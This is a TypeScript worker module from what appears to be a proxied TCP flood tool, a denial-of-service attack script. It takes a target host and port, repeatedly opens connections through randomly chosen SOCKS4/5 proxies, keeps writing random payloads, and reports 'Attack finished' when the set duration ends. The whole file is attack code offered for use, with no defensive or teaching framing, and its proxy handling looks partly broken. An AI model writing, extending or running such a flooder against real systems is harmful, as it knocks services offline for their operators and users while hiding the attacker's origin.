import { parentPort, workerData } from 'worker_threads';
import net from 'net';
import { Socket } from 'net';
import { SocksProxyAgent } from "socks-proxy-agent";

interface ProxyConfig {
  protocol: 'socks4' | 'socks5';
  host: string;
  port: number;
}

interface WorkerConfig {
  targetHost: string;
  port: number;
  proxies: ProxyConfig[];
  duration: number;
  packetDelay: number;
  packetSize: number;
}

const DEFAULT_SOCKET_CONFIG = {
  timeout: 5000,
};

const randomString = (length: number): string => {
  return [...Array(length)]
    .map(() => String.fromCharCode(97 + Math.floor(Math.random() * 26)))
    .join('');
};

// Dummy function for proxy agent creation. Replace with real implementation.
function createAgent(proxy) {
  if (proxy.protocol !== "socks4" && proxy.protocol !== "socks5") {
    throw new Error("Unsupported proxy protocol for agent: " + proxy.protocol);
  }

  const uri = `${proxy.protocol}://${
    proxy.username && proxy.password
      ? `${proxy.username}:${proxy.password}@`
      : ""
  }${proxy.host}:${proxy.port}`;

  return new SocksProxyAgent(uri);
}

function createTcpClient(
  proxy: ProxyConfig,
  socketConfig: typeof DEFAULT_SOCKET_CONFIG & { host: string; port: number },
  callback?: (socket: Socket) => void
): Socket {
  if (proxy.protocol !== 'socks4' && proxy.protocol !== 'socks5') {
    throw new Error(`Unsupported proxy protocol: ${proxy.protocol}`);
  }

  const socket = new net.Socket();
  const proxyAgent = createAgent(proxy);
  const config = { ...DEFAULT_SOCKET_CONFIG, ...socketConfig };

  socket.setTimeout(config.timeout);

  socket.connect({ host: config.host, port: config.port, agent: proxyAgent }, () => {
    callback?.(socket);
    (socket as any).open = true;
  });

  socket.on('close', () => {
    (socket as any).open = false;
  });

  socket.on('timeout', () => {
    socket.destroy();
    (socket as any).open = false;
  });

  return socket;
}

const {
  targetHost,
  port,
  proxies,
  duration,
  packetDelay,
  packetSize,
} = workerData as WorkerConfig;

const fixedTarget = `${targetHost}:${port}`;
const startTime = Date.now();
let totalPackets = 0;

const sendPacket = (proxy: ProxyConfig) => {
  const socket = createTcpClient(proxy, {host: targetHost, port: port, timeout: 0});

  socket.on('connect', () => {
    totalPackets++;
    parentPort?.postMessage({
      log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
      totalPackets,
    });

    const interval = setInterval(() => {
      if (socket.writable && (socket as any).open) {
        socket.write(randomString(packetSize));
      } else {
        clearInterval(interval);
      }
    }, 3000);
  });

  socket.on('error', (err) => {
    parentPort?.postMessage({
      log: `❌ Packet failed from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}: ${err.message}`,
      totalPackets,
    });
  });
};

const interval = setInterval(() => {
  const elapsedTime = (Date.now() - startTime) / 1000;

  if (elapsedTime >= duration) {
    clearInterval(interval);
    parentPort?.postMessage({ log: '⚠️ Attack finished', totalPackets });
    process.exit(0);
  }

  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
  sendPacket(proxy);
}, packetDelay);